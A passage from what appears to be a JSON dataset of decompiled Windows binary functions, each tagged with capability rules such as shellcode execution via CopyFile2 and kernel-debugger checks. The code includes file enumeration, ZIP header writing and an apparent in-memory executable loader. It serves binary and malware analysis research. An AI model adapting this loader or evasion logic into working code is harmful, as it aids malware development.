ppppuVar16 = ppppuVar16 + 1;\n                }\n                param_5 = pppuStack112;\n                param_11 = iStack68;\n                cVar2 = *ppppuVar16;\n            }\n            param_7 = ppppuStack84;\n            if (uStack64 < 0x10) {\n                param_7 = &ppppuStack84;\n            }\n            unaff_EBP = 0;\n        }\n    }\n    arg_8h = uStack8;\n    ppuVar3 = param_5[8];\n    ppuVar12 = piStack96 + unaff_EBX + param_11 + unaff_EBP;\n    if (((param_5[9] < 0) || ((param_5[9] < 1 && (ppuVar3 == NULL)))) || (ppuVar3 <= ppuVar12)) {\n        iVar10 = 0;\n    }\n    else {\n        iVar10 = ppuVar3 - ppuVar12;\n    }\n    if ((param_5[5] & 0x1c0) != 0x40) {\n        if (((param_5[5] & 0x1c0) == 0x100) && (iStack120 != 0)) {\n            puVar14 = fcn.0041e040(uStack8, &iStack120, unaff_retaddr, param_1, param_7, 1, piVar15);\n            unaff_retaddr = *puVar14;\n            param_1 = puVar14[1];\n            param_7 = param_7 + 1;\n            param_11 = param_11 + -1;\n        }\n        puVar14 = fcn.0041dfd0(arg_8h, &iStack120, unaff_retaddr, param_1, param_3, iVar10);\n        unaff_retaddr = *puVar14;\n        param_1 = puVar14[1];\n        iVar10 = 0;\n    }\n    iVar11 = fcn.00428750(param_7, uStack124, param_11);\n    if (iVar11 != 0) {\n        iVar1 = (iVar11 - param_7) + 1;\n        puVar14 = fcn.0041e0b0(arg_8h, &iStack120, unaff_retaddr, param_1, param_7, iVar11 - param_7, pppuStack108);\n        puVar14 = fcn.0041dfd0(arg_8h, &iStack120, *puVar14, puVar14[1], 0x30, unaff_EBX);\n        uVar13 = *puVar14;\n        uVar4 = puVar14[1];\n        uVar6 = (**(*piStack104 + 4))();\n        piStack104 = piStack104 & 0xffffff00 | uVar6;\n        puVar14 = fcn.0041dfd0(arg_8h, &iStack120, uVar13, uVar4, piStack104, 1);\n        puVar14 = fcn.0041dfd0(arg_8h, &piStack104, *puVar14, puVar14[1], 0x30, piStack96);\n        unaff_retaddr = *puVar14;\n        param_1 = puVar14[1];\n        param_7 = param_7 + iVar1;\n        param_11 = param_11 - iVar1;\n    }\n    iVar11 = fcn.00428750(param_7, 0x65, param_11);\n    if (iVar11 != 0) {\n        iVar1 = (iVar11 - param_7) + 1;\n        puVar14 = fcn.0041e0b0(arg_8h, &piStack104, unaff_retaddr, param_1, param_7, iVar11 - param_7, pppuStack108);\n        puVar14 = fcn.0041dfd0(arg_8h, &piStack104, *puVar14, puVar14[1], 0x30, unaff_EBP);\n        unaff_EBP = 0;\n        uVar13 = 0x446550;\n        if ((*(pppuStack112 + 5) & 4) == 0) {\n            uVar13 = 0x44654c;\n        }\n        puVar14 = fcn.0041e040(arg_8h, &piStack104, *puVar14, puVar14[1], uVar13, 1);\n        unaff_retaddr = *puVar14;\n        param_1 = puVar14[1];\n        param_7 = param_7 + iVar1;\n        param_11 = param_11 - iVar1;\n    }\n    puVar14 = fcn.0041e0b0(arg_8h, &piStack104, unaff_retaddr, param_1, param_7, param_11, pppuStack108);\n    puVar14 = fcn.0041dfd0(arg_8h, &piStack104, *puVar14, puVar14[1], 0x30, unaff_EBP);\n    uVar13 = *puVar14;\n    uVar4 = puVar14[1];\n    pppuStack112[8] = NULL;\n    pppuStack112[9] = NULL;\n    fcn.0041dfd0(arg_8h, uStack88, uVar13, uVar4, param_3, iVar10);\n    if (0xf < uStack64) {\n        fcn.00427a17(ppppuStack84);\n    }\n    uStack64 = 0xf;\n    iStack68 = 0;\n    ppppuStack84 = ppppuStack84 & 0xffffff00;\n    if (0xf < uStack36) {\n        fcn.00427a17(ppppuStack56);\n    }\n    *in_FS_OFFSET = piStack24;\n    fcn.00427841(iVar10);\n    return;\n}\n",
        "token_count": 2995
    },
    "0041f420": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0041f420(uint param_1, uint param_2, uint param_3, uint param_4, uint32_t param_5, uint param_6, char *param_7\n                 , uint32_t param_8)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint ***pppuVar7;\n    int32_t iVar8;\n    int32_t unaff_EBX;\n    uint *puVar9;\n    int32_t **in_FS_OFFSET;\n    uint unaff_retaddr;\n    int32_t iVar10;\n    uint32_t uStack80;\n    uint ***pppuStack76;\n    uint32_t uStack72;\n    int32_t *apiStack68 [2];\n    uint uStack60;\n    uint ***pppuStack56;\n    uchar auStack52 [4];\n    uint uStack48;\n    uint32_t uStack36;\n    int32_t *piStack24;\n    uint32_t uStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43c010;\n    piStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &uStack80;\n    uVar5 = *0x44d6a0 ^ &stack0xffffffa0;\n    *in_FS_OFFSET = &piStack12;\n    uStack48 = param_2;\n    uStack72 = param_5;\n    uVar6 = fcn.00412730(apiStack68, uVar5);\n    uStack8 = 0;\n    uStack60 = fcn.0041e740(uVar6);\n    uVar5 = uStack72;\n    uStack8 = 0xffffffff;\n    if (uStack72 != 0) {\n        fcn.00426b13(0);\n        iVar10 = *(uVar5 + 4);\n        if ((iVar10 != 0) && (iVar10 != -1)) {\n            *(uVar5 + 4) = iVar10 + -1;\n        }\n        iVar10 = *(uVar5 + 4);\n        fcn.00426b3b();\n        puVar9 = ~-(iVar10 != 0) & uVar5;\n        if (puVar9 != NULL) {\n            (***puVar9)(1);\n        }\n    }\n    fcn.0041e390(auStack52);\n    cVar1 = *param_7;\n    uStack16 = 1;\n    if ((cVar1 == '+') || (cVar1 == '-')) {\n        iVar10 = 1;\n    }\n    else if ((cVar1 == '0') && ((param_7[1] == 'x' || (param_7[1] == 'X')))) {\n        iVar10 = 2;\n    }\n    else {\n        iVar10 = 0;\n    }\n    pppuVar7 = pppuStack56;\n    if (uStack36 < 0x10) {\n        pppuVar7 = &pppuStack56;\n    }\n    if (*pppuVar7 != '\\x7f') {\n        pppuVar7 = pppuStack56;\n        if (uStack36 < 0x10) {\n            pppuVar7 = &pppuStack56;\n        }\n        if ('\\0' < *pppuVar7) {\n            if (uStack36 < 0x10) {\n                pppuStack76 = &pppuStack56;\n            }\n            else {\n                pppuStack76 = pppuStack56;\n            }\n            cVar1 = *pppuStack76;\n            uVar5 = param_8;\n            while (((cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar5 - iVar10))) {\n                uVar5 = uVar5 - cVar1;\n                iVar8 = (param_8 - uVar5) + 1;\n                fcn.00429ac6(param_7 + uVar5 + 1, iVar8, param_7 + uVar5, iVar8);\n                param_7[uVar5] = '\\0';\n                param_8 = param_8 + 1;\n                if ('\\0' < *(pppuStack76 + 1)) {\n                    pppuStack76 = pppuStack76 + 1;\n                }\n                cVar1 = *pppuStack76;\n            }\n        }\n    }\n    uVar6 = uStack8;\n    uVar5 = *(unaff_EBX + 0x20);\n    if (((*(unaff_EBX + 0x24) < 0) || ((*(unaff_EBX + 0x24) < 1 && (uVar5 == 0)))) || (uVar5 <= param_8)) {\n        iVar8 = 0;\n    }\n    else {\n        iVar8 = uVar5 - param_8;\n    }\n    uVar5 = *(unaff_EBX + 0x14) & 0x1c0;\n    if (uVar5 != 0x40) {\n        if (uVar5 == 0x100) {\n            puVar9 = fcn.0041e040(uStack8, &pppuStack76, unaff_retaddr, param_1, param_7, iVar10);\n            param_7 = param_7 + iVar10;\n            param_8 = param_8 - iVar10;\n            puVar9 = fcn.0041dfd0(uVar6, &stack0xffffffa4, *puVar9, puVar9[1], param_3, iVar8);\n            unaff_retaddr = *puVar9;\n            param_1 = puVar9[1];\n        }\n        else {\n            puVar9 = fcn.0041dfd0(uStack8, &stack0xffffffa4, unaff_retaddr, param_1, param_3, iVar8);\n            unaff_retaddr = *puVar9;\n            param_1 = puVar9[1];\n        }\n        iVar8 = 0;\n    }\n    uVar4 = (**(*apiStack68[0] + 8))();\n    uStack80 = uStack80 & 0xffffff00 | uVar4;\n    puVar9 = fcn.0041e0b0(uVar6, apiStack68, unaff_retaddr, param_1, param_7, param_8, uStack80);\n    uVar2 = *puVar9;\n    uVar3 = puVar9[1];\n    *(unaff_EBX + 0x20) = 0;\n    *(unaff_EBX + 0x24) = 0;\n    fcn.0041dfd0(uVar6, uStack60, uVar2, uVar3, param_3, iVar8);\n    if (0xf < uStack36) {\n        fcn.00427a17(pppuStack56);\n    }\n    *in_FS_OFFSET = piStack24;\n    fcn.00427841(iVar10);\n    return;\n}\n",
        "token_count": 1590
    },
    "00421250": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00421250(uint *param_1)\n\n{\n    int16_t iVar1;\n    uint *arg_8h;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int32_t *in_FS_OFFSET;\n    uchar *puVar5;\n    uchar *puStack708;\n    uchar *puStack704;\n    uchar *puStack700;\n    uint32_t uStack696;\n    uchar auStack676 [4];\n    uint32_t uStack672;\n    uint *puStack668;\n    uint uStack664;\n    uint uStack660;\n    uchar auStack656 [4];\n    uint32_t uStack652;\n    uint uStack636;\n    uint32_t uStack632;\n    uchar auStack616 [16];\n    int16_t iStack600;\n    uchar auStack598 [18];\n    int16_t iStack580;\n    uchar auStack578 [526];\n    uchar uStack52;\n    uint uStack48;\n    uchar uStack32;\n    uint uStack28;\n    uint32_t uStack16;\n    int32_t iStack12;\n    uint32_t uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43c3c0;\n    iStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &stack0xfffffd5c;\n    uStack696 = *0x44d6a0 ^ &stack0xfffffd4c;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    puStack668 = param_1;\n    uStack672 = 0;\n    puStack700 = &stack0x00000008;\n    puStack704 = &stack0xfffffd84;\n    uStack4 = 1;\n    puStack708 = 0x4212ba;\n    arg_8h = fcn.00420620();\n    if (7 < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    puStack708 = &stack0xfffffd98;\n    uVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)();\n    if (7 < uStack632) {\n        fcn.00427a17(uStack652);\n    }\n    uStack632 = 7;\n    uStack636 = 0;\n    uStack652 = uStack652 & 0xffff0000;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    uStack660 = 7;\n    piVar4 = &stack0xfffffdbc;\n    uStack664 = 0;\n    do {\n        iVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n    } while (iVar1 != 0);\n    fcn.0041c2a0(&stack0xfffffdbc, piVar4 - &stack0xfffffdbe >> 1);\n    puVar5 = &stack0xfffffd50;\n    uStack28 = CONCAT31(uStack28._1_3_, 2);\n    fcn.00421160(puVar5);\n    uStack32 = 1;\n    if (7 < uStack672) {\n        fcn.00427a17(uVar2);\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(puStack704, &stack0xfffffd84);\n    while (iVar3 != 0) {\n        piVar4 = &stack0xfffffda8;\n        puStack700 = puStack700 & 0xffff0000;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        fcn.0041c2a0(&stack0xfffffda8, piVar4 - &stack0xfffffdaa >> 1);\n        uStack48 = CONCAT31(uStack48._1_3_, 3);\n        fcn.00421160(&stack0xfffffd3c);\n        uStack52 = 1;\n        if (7 < uVar2) {\n            fcn.00427a17(arg_8h);\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(puVar5, &stack0xfffffd70);\n    }\n    if (0xf < uStack8) {\n        fcn.00427a17(uStack28);\n    }\n    *in_FS_OFFSET = uStack48;\n    fcn.00427841(arg_8h);\n    return;\n}\n",
        "token_count": 1015
    },
    "00423160": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.00423160(unkbyte3 param_1, int32_t param_2, code *param_3, uint param_4)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack4;\n    \n    uVar2 = param_4;\n    pcVar1 = param_3;\n    uStack4 = CONCAT13(0x50, param_1);\n    (*param_3)(param_4, &uStack4 + 3, 1);\n    uStack4 = CONCAT13(0x4b, uStack4);\n    (*pcVar1)(uVar2, &uStack4 + 3, 1);\n    param_3._0_1_ = 3;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = 4;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 2);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 3);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x2c);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x2d);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 6);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 7);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 8);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 9);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 10);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xb);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xc);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xd);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xe);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xf);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x10);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x11);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x12);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x13);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x14);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x15);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x16);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x17);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x18);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x18) >> 8;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x1c);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3 = CONCAT31(param_3._1_3_, *(param_2 + 0x1c) >> 8);\n    (*pcVar1)(uVar2, &param_3, 1);\n    iVar3 = (*pcVar1)(uVar2, param_2 + 0x148, *(param_2 + 0x18));\n    if (iVar3 != *(param_2 + 0x18)) {\n        return 10;\n    }\n    if ((*(param_2 + 0x1c) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(param_2 + 0x13c), *(param_2 + 0x1c)),  iVar3 != *(param_2 + 0x1c))) {\n        return 10;\n    }\n    return 0;\n}\n",
        "token_count": 1356
    },
    "004233e0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.004233e0(unkbyte3 param_1, int32_t param_2, code *param_3, uint param_4)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uStack4;\n    \n    uVar2 = param_4;\n    pcVar1 = param_3;\n    uStack4 = CONCAT13(0x50, param_1);\n    (*param_3)(param_4, &uStack4 + 3, 1);\n    uStack4 = CONCAT13(0x4b, uStack4);\n    (*pcVar1)(uVar2, &uStack4 + 3, 1);\n    param_3._0_1_ = 7;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = 8;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xc);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xd);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xe);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0xf);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x10);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x11);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x12);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x13);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x14);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x15);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x16);\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3 = CONCAT31(param_3._1_3_, *(param_2 + 0x17));\n    (*pcVar1)(uVar2, &param_3, 1);\n    return 0;\n}\n",
        "token_count": 687
    },
    "00423520": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.00423520(unkbyte3 param_1, uchar *param_2, code *param_3, uint param_4)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack4;\n    \n    uVar2 = param_4;\n    pcVar1 = param_3;\n    uStack4 = CONCAT13(0x50, param_1);\n    (*param_3)(param_4, &uStack4 + 3, 1);\n    uStack4 = CONCAT13(0x4b, uStack4);\n    (*pcVar1)(uVar2, &uStack4 + 3, 1);\n    param_3._0_1_ = 1;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = 2;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *param_2;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[1];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[2];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[3];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[4];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[5];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[6];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[7];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[8];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[9];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[10];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0xb];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0xc];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0xd];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0xe];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0xf];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x10];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x11];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x12];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x13];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x14];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x15];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x16];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x17];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x18];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x18) >> 8;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x20];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x20) >> 8;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x24];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = *(param_2 + 0x24) >> 8;\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x28];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x29];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x2a];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x2b];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x30];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x31];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x32];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x33];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x34];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x35];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3._0_1_ = param_2[0x36];\n    (*pcVar1)(uVar2, &param_3, 1);\n    param_3 = CONCAT31(param_3._1_3_, param_2[0x37]);\n    (*pcVar1)(uVar2, &param_3, 1);\n    iVar3 = (*pcVar1)(uVar2, param_2 + 0x148, *(param_2 + 0x18));\n    if (iVar3 != *(param_2 + 0x18)) {\n        return 10;\n    }\n    if ((*(param_2 + 0x20) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(param_2 + 0x140), *(param_2 + 0x20)),  iVar3 != *(param_2 + 0x20))) {\n        return 10;\n    }\n    if ((*(param_2 + 0x24) != 0) &&\n       (iVar3 = (*pcVar1)(uVar2, *(param_2 + 0x144), *(param_2 + 0x24)),  iVar3 != *(param_2 + 0x24))) {\n        return 10;\n    }\n    return 0;\n}\n",
        "token_count": 1948
    },
    "00404370": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00404370(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t unaff_ESI;\n    uint32_t uVar6;\n    \n    uVar6 = -((in_AL & 2) != 0);\n    uVar4 = 0;\n    if (*(unaff_ESI + 0x46) != 0) {\n        uVar5 = *(unaff_ESI + 0x46);\n        puVar3 = *(unaff_ESI + 0x138) + 0xc;\n        do {\n            if (puVar3[-1] != 0) {\n                uVar1 = *puVar3;\n                if (uVar1 < uVar6) {\n                    uVar6 = uVar1;\n                }\n                uVar1 = uVar1 + puVar3[-1];\n                if (uVar4 < uVar1) {\n                    uVar4 = uVar1;\n                }\n            }\n            puVar3 = puVar3 + 10;\n            uVar5 = uVar5 - 1;\n        } while (uVar5 != 0);\n    }\n    iVar2 = (**0x45ff44)(*(unaff_ESI + 0x74) + uVar6, uVar4 - uVar6, 0x3000, 0x40);\n    *(unaff_ESI + 0x148) = iVar2;\n    *(unaff_ESI + 0x144) = *(unaff_ESI + 0x74);\n    if (iVar2 == 0) {\n        if ((*(unaff_ESI + 0x56) & 1) != 0) {\n            return 4;\n        }\n        iVar2 = (**0x45ff44)(0, uVar4 - uVar6, 0x3000, 0x40);\n        *(unaff_ESI + 0x148) = iVar2;\n        *(unaff_ESI + 0x144) = iVar2 - uVar6;\n    }\n    return (-(*(unaff_ESI + 0x148) != 0) & 0xfffffffd) + 3;\n}\n",
        "token_count": 510
    },
    "004047c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404944)\n// WARNING: Removing unreachable block (ram,0x00404939)\n// WARNING: Removing unreachable block (ram,0x0040495f)\n// WARNING: Removing unreachable block (ram,0x0040497a)\n\nvoid fcn.004047c0(int32_t param_1, uint param_2, uint32_t param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    uint in_stack_fffffea0;\n    int32_t iStack248;\n    uint uStack168;\n    int32_t iStack28;\n    uint uStack24;\n    code *pcStack8;\n    \n    if (param_1 == 0) {\n        fcn.00427841(in_stack_fffffea0);\n        return;\n    }\n    pcStack8 = NULL;\n    iVar1 = fcn.00404290(param_1, param_2);\n    if (((((iVar1 == 0) && (iVar1 = fcn.00404370(),  iVar1 == 0)) &&\n         (iVar1 = fcn.00404420(param_1, param_2, param_3),  iVar1 == 0)) &&\n        ((iVar1 = fcn.004044c0(&stack0xfffffea0),  iVar1 == 0 && (iVar1 = fcn.00404580(),  iVar1 == 0)))) &&\n       (iVar1 = fcn.00404700(),  iVar1 == 0)) {\n        if (((param_3 & 1) == 0) && (iStack248 != 0)) {\n            pcStack8 = iStack248 + iStack28;\n            iVar1 = (*pcStack8)(iStack28, 1, 0);\n            if (iVar1 == 0) goto code_r0x00404985;\n        }\n        if (param_4 != NULL) {\n            param_4[1] = param_3;\n            param_4[2] = iStack28;\n            param_4[3] = uStack24;\n            param_4[4] = pcStack8;\n            *param_4 = 0x20;\n            param_4[5] = uStack168;\n            param_4[6] = 0;\n            param_4[7] = 0;\n        }\n    }\ncode_r0x00404985:\n    fcn.00427841(in_stack_fffffea0);\n    return;\n}\n",
        "token_count": 539
    },
    "00407640": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __thiscall fcn.00407640(int32_t *param_1, int32_t param_2, int32_t *param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    uint8_t uVar11;\n    uint8_t uVar12;\n    int32_t *piVar13;\n    char *pcVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint var_4h;\n    uint var_108h;\n    uint var_10ch;\n    uint var_110h;\n    uint var_114h;\n    uint var_118h;\n    uint var_11ch;\n    uint var_120h;\n    uint var_124h;\n    uint var_128h;\n    uint32_t in_stack_fffffd80;\n    uint uStack636;\n    uint32_t uStack632;\n    int32_t *piStack628;\n    int32_t iStack624;\n    int32_t iStack620;\n    ulong uStack616;\n    uchar auStack608 [4];\n    uint32_t auStack604 [4];\n    uint32_t uStack588;\n    int32_t iStack580;\n    int32_t iStack576;\n    uint32_t uStack552;\n    char acStack524 [260];\n    char acStack264 [260];\n    uint32_t uStack4;\n    \n    uStack4 = *0x44d6a0 ^ &stack0xfffffd80;\n    piStack628 = param_1;\n    uStack616 = CONCAT44(uStack616._4_4_, uStack616);\n    if ((-2 < param_2) && (uStack616 = CONCAT44(uStack616._4_4_, uStack616),  param_2 < *(*param_1 + 4))) {\n        if (param_1[1] != -1) {\n            fcn.00407550(*param_1);\n        }\n        param_1[1] = -1;\n        if (param_2 == param_1[0x4d]) {\n            if (param_2 != -1) {\n                piVar13 = param_1 + 2;\n                for (iVar9 = 0x4b; iVar9 != 0; iVar9 = iVar9 + -1) {\n                    *param_3 = *piVar13;\n                    piVar13 = piVar13 + 1;\n                    param_3 = param_3 + 1;\n                }\n                goto code_r0x00407b57;\n            }\n        }\n        else if (param_2 != -1) {\n            if (param_2 < *(*param_1 + 0x10)) {\n                fcn.00407170(*param_1);\n            }\n            iVar9 = *(*param_1 + 0x10);\n            while (iVar9 < param_2) {\n                fcn.004071c0(*param_1);\n                iVar9 = *(*param_1 + 0x10);\n            }\n            fcn.00406db0(*param_1, auStack604, 0, acStack524, 0x104, 0, 0, 0, 0);\n            iVar9 = fcn.00407360(*param_1, auStack608, &uStack636, &uStack632);\n            uStack616 = CONCAT44(uStack616._4_4_, uStack616);\n            if (iVar9 == 0) {\n                pcVar14 = **param_1;\n                if (*pcVar14 == '\\0') {\n                    *(pcVar14 + 0x1c) = uStack636;\n                }\n                else {\n                    